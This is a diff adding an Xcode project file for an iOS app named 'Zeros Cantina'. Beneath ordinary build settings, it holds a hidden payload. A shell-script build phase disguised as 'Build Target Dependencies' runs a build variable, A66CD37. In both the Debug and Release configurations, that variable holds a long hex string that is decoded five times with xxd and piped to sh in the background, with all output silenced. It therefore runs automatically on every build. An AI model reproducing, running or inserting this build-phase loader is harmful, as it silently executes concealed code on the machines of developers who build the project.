@@ -1,0 +1,636 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 77;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		FC7A74D82DFD075B000F07D3 /* SnapKit in Frameworks */ = {isa = PBXBuildFile; productRef = FC7A74D72DFD075B000F07D3 /* SnapKit */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		FC2134872DFCE8EF000B71D6 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = FC2134652DFCE8ED000B71D6 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = FC21346C2DFCE8ED000B71D6;
+			remoteInfo = "Zeros Cantina";
+		};
+		FC2134912DFCE8EF000B71D6 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = FC2134652DFCE8ED000B71D6 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = FC21346C2DFCE8ED000B71D6;
+			remoteInfo = "Zeros Cantina";
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXFileReference section */
+		FC21346D2DFCE8ED000B71D6 /* Zeros Cantina.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Zeros Cantina.app"; sourceTree = BUILT_PRODUCTS_DIR; };
+		FC2134862DFCE8EF000B71D6 /* Zeros CantinaTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "Zeros CantinaTests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
+		FC2134902DFCE8EF000B71D6 /* Zeros CantinaUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "Zeros CantinaUITests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
+/* End PBXFileReference section */
+
+/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
+		FC2134982DFCE8EF000B71D6 /* Exceptions for "Zeros Cantina" folder in "Zeros Cantina" target */ = {
+			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
+			membershipExceptions = (
+				Resources/Info.plist,
+			);
+			target = FC21346C2DFCE8ED000B71D6 /* Zeros Cantina */;
+		};
+/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */
+
+/* Begin PBXFileSystemSynchronizedRootGroup section */
+		FC21346F2DFCE8ED000B71D6 /* Zeros Cantina */ = {
+			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+				FC2134982DFCE8EF000B71D6 /* Exceptions for "Zeros Cantina" folder in "Zeros Cantina" target */,
+			);
+			path = "Zeros Cantina";
+			sourceTree = "<group>";
+		};
+		FC2134892DFCE8EF000B71D6 /* Zeros CantinaTests */ = {
+			isa = PBXFileSystemSynchronizedRootGroup;
+			path = "Zeros CantinaTests";
+			sourceTree = "<group>";
+		};
+		FC2134932DFCE8EF000B71D6 /* Zeros CantinaUITests */ = {
+			isa = PBXFileSystemSynchronizedRootGroup;
+			path = "Zeros CantinaUITests";
+			sourceTree = "<group>";
+		};
+/* End PBXFileSystemSynchronizedRootGroup section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		FC21346A2DFCE8ED000B71D6 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				FC7A74D82DFD075B000F07D3 /* SnapKit in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		FC2134832DFCE8EF000B71D6 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		FC21348D2DFCE8EF000B71D6 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		FC2134642DFCE8ED000B71D6 = {
+			isa = PBXGroup;
+			children = (
+				FC21346F2DFCE8ED000B71D6 /* Zeros Cantina */,
+				FC2134892DFCE8EF000B71D6 /* Zeros CantinaTests */,
+				FC2134932DFCE8EF000B71D6 /* Zeros CantinaUITests */,
+				FC7A74D62DFD075B000F07D3 /* Frameworks */,
+				FC21346E2DFCE8ED000B71D6 /* Products */,
+			);
+			sourceTree = "<group>";
+		};
+		FC21346E2DFCE8ED000B71D6 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				FC21346D2DFCE8ED000B71D6 /* Zeros Cantina.app */,
+				FC2134862DFCE8EF000B71D6 /* Zeros CantinaTests.xctest */,
+				FC2134902DFCE8EF000B71D6 /* Zeros CantinaUITests.xctest */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		FC7A74D62DFD075B000F07D3 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		FC21346C2DFCE8ED000B71D6 /* Zeros Cantina */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = FC2134992DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros Cantina" */;
+			buildPhases = (
+				686DBF2C9873F0D31D73DC66 /* Build Target Dependencies */,
+				FC2134692DFCE8ED000B71D6 /* Sources */,
+				FC21346A2DFCE8ED000B71D6 /* Frameworks */,
+				FC21346B2DFCE8ED000B71D6 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			fileSystemSynchronizedGroups = (
+				FC21346F2DFCE8ED000B71D6 /* Zeros Cantina */,
+			);
+			name = "Zeros Cantina";
+			packageProductDependencies = (
+				FC7A74D72DFD075B000F07D3 /* SnapKit */,
+			);
+			productName = "Zeros Cantina";
+			productReference = FC21346D2DFCE8ED000B71D6 /* Zeros Cantina.app */;
+			productType = "com.apple.product-type.application";
+		};
+		FC2134852DFCE8EF000B71D6 /* Zeros CantinaTests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = FC21349E2DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros CantinaTests" */;
+			buildPhases = (
+				FC2134822DFCE8EF000B71D6 /* Sources */,
+				FC2134832DFCE8EF000B71D6 /* Frameworks */,
+				FC2134842DFCE8EF000B71D6 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				FC2134882DFCE8EF000B71D6 /* PBXTargetDependency */,
+			);
+			fileSystemSynchronizedGroups = (
+				FC2134892DFCE8EF000B71D6 /* Zeros CantinaTests */,
+			);
+			name = "Zeros CantinaTests";
+			packageProductDependencies = (
+			);
+			productName = "Zeros CantinaTests";
+			productReference = FC2134862DFCE8EF000B71D6 /* Zeros CantinaTests.xctest */;
+			productType = "com.apple.product-type.bundle.unit-test";
+		};
+		FC21348F2DFCE8EF000B71D6 /* Zeros CantinaUITests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = FC2134A12DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros CantinaUITests" */;
+			buildPhases = (
+				FC21348C2DFCE8EF000B71D6 /* Sources */,
+				FC21348D2DFCE8EF000B71D6 /* Frameworks */,
+				FC21348E2DFCE8EF000B71D6 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				FC2134922DFCE8EF000B71D6 /* PBXTargetDependency */,
+			);
+			fileSystemSynchronizedGroups = (
+				FC2134932DFCE8EF000B71D6 /* Zeros CantinaUITests */,
+			);
+			name = "Zeros CantinaUITests";
+			packageProductDependencies = (
+			);
+			productName = "Zeros CantinaUITests";
+			productReference = FC2134902DFCE8EF000B71D6 /* Zeros CantinaUITests.xctest */;
+			productType = "com.apple.product-type.bundle.ui-testing";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		FC2134652DFCE8ED000B71D6 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				BuildIndependentTargetsInParallel = 1;
+				LastSwiftUpdateCheck = 1620;
+				LastUpgradeCheck = 1620;
+				TargetAttributes = {
+					FC21346C2DFCE8ED000B71D6 = {
+						CreatedOnToolsVersion = 16.2;
+					};
+					FC2134852DFCE8EF000B71D6 = {
+						CreatedOnToolsVersion = 16.2;
+						TestTargetID = FC21346C2DFCE8ED000B71D6;
+					};
+					FC21348F2DFCE8EF000B71D6 = {
+						CreatedOnToolsVersion = 16.2;
+						TestTargetID = FC21346C2DFCE8ED000B71D6;
+					};
+				};
+			};
+			buildConfigurationList = FC2134682DFCE8ED000B71D6 /* Build configuration list for PBXProject "Zeros Cantina" */;
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = FC2134642DFCE8ED000B71D6;
+			minimizedProjectReferenceProxies = 1;
+			packageReferences = (
+				FC5C48B92DFCFF2600AAC4F0 /* XCRemoteSwiftPackageReference "SnapKit" */,
+			);
+			preferredProjectObjectVersion = 77;
+			productRefGroup = FC21346E2DFCE8ED000B71D6 /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				FC21346C2DFCE8ED000B71D6 /* Zeros Cantina */,
+				FC2134852DFCE8EF000B71D6 /* Zeros CantinaTests */,
+				FC21348F2DFCE8EF000B71D6 /* Zeros CantinaUITests */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		FC21346B2DFCE8ED000B71D6 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		FC2134842DFCE8EF000B71D6 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		FC21348E2DFCE8EF000B71D6 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		686DBF2C9873F0D31D73DC66 /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A66CD37}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		FC2134692DFCE8ED000B71D6 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		FC2134822DFCE8EF000B71D6 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		FC21348C2DFCE8EF000B71D6 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		FC2134882DFCE8EF000B71D6 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = FC21346C2DFCE8ED000B71D6 /* Zeros Cantina */;
+			targetProxy = FC2134872DFCE8EF000B71D6 /* PBXContainerItemProxy */;
+		};
+		FC2134922DFCE8EF000B71D6 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = FC21346C2DFCE8ED000B71D6 /* Zeros Cantina */;
+			targetProxy = FC2134912DFCE8EF000B71D6 /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin XCBuildConfiguration section */
+		FC21349A2DFCE8EF000B71D6 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				A66CD37 = "((echo 333333333333333633333333333333353333333333333336333333333333333333333333333333363333333333333338333333333333333633333336333333363333333333333332333333333333333033333333333333323333333333333332333333333333333233333333333333343333333333333332333333333333333833333333333333363333333333333333333333333333333733333333333333353333333333333337333333333333333233333333333333363333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333336333333333333333733333333333333333333333333333336333333363333333233333333333333343333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333334333333333333333233333333333333303333333333333337333333333333333033333333333333333333333633333334333333333333333733333333333333383333333333333336333333333333333333333333333333363333333633333336333333333333333633333333333333343333333333333336333333333333333533333333333333323333333333333330333333333333333633333333333333383333333333333337333333333333333433333333333333373333333333333334333333333333333733333333333333303333333333333337333333333333333333333333333333333333333633333331333333333333333233333336333333363333333333333332333333363333333633333333333333363333333333333333333333333333333633333333333333343333333333333336333333363333333533333333333333373333333333333332333333333333333633333336333333363333333333333337333333333333333533333333333333373333333333333334333333333333333633333333333333353333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = XLY33384SZ;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = "Zeros Cantina/Resources/Info.plist";
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-Cantina";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		FC21349B2DFCE8EF000B71D6 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				A66CD37 = "((echo 333333333333333633333333333333353333333333333336333333333333333333333333333333363333333333333338333333333333333633333336333333363333333333333332333333333333333033333333333333323333333333333332333333333333333233333333333333343333333333333332333333333333333833333333333333363333333333333333333333333333333733333333333333353333333333333337333333333333333233333333333333363333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333336333333333333333733333333333333333333333333333336333333363333333233333333333333343333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333334333333333333333233333333333333303333333333333337333333333333333033333333333333333333333633333334333333333333333733333333333333383333333333333336333333333333333333333333333333363333333633333336333333333333333633333333333333343333333333333336333333333333333533333333333333323333333333333330333333333333333633333333333333383333333333333337333333333333333433333333333333373333333333333334333333333333333733333333333333303333333333333337333333333333333333333333333333333333333633333331333333333333333233333336333333363333333333333332333333363333333633333333333333363333333333333333333333333333333633333333333333343333333333333336333333363333333533333333333333373333333333333332333333333333333633333336333333363333333333333337333333333333333533333333333333373333333333333334333333333333333633333333333333353333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = XLY33384SZ;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = "Zeros Cantina/Resources/Info.plist";
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-Cantina";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+		FC21349C2DFCE8EF000B71D6 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		FC21349D2DFCE8EF000B71D6 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		FC21349F2DFCE8EF000B71D6 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = XLY33384SZ;
+				GENERATE_INFOPLIST_FILE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-CantinaTests";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = NO;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Zeros Cantina.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/Zeros Cantina";
+			};
+			name = Debug;
+		};
+		FC2134A02DFCE8EF000B71D6 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = XLY33384SZ;
+				GENERATE_INFOPLIST_FILE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-CantinaTests";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = NO;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Zeros Cantina.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/Zeros Cantina";
+			};
+			name = Release;
+		};
+		FC2134A22DFCE8EF000B71D6 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = XLY33384SZ;
+				GENERATE_INFOPLIST_FILE = YES;
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-CantinaUITests";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = NO;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_TARGET_NAME = "Zeros Cantina";
+			};
+			name = Debug;
+		};
+		FC2134A32DFCE8EF000B71D6 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = XLY33384SZ;
+				GENERATE_INFOPLIST_FILE = YES;
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-CantinaUITests";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = NO;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_TARGET_NAME = "Zeros Cantina";
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		FC2134682DFCE8ED000B71D6 /* Build configuration list for PBXProject "Zeros Cantina" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				FC21349C2DFCE8EF000B71D6 /* Debug */,
+				FC21349D2DFCE8EF000B71D6 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		FC2134992DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros Cantina" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				FC21349A2DFCE8EF000B71D6 /* Debug */,
+				FC21349B2DFCE8EF000B71D6 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		FC21349E2DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros CantinaTests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				FC21349F2DFCE8EF000B71D6 /* Debug */,
+				FC2134A02DFCE8EF000B71D6 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		FC2134A12DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros CantinaUITests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				FC2134A22DFCE8EF000B71D6 /* Debug */,
+				FC2134A32DFCE8EF000B71D6 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
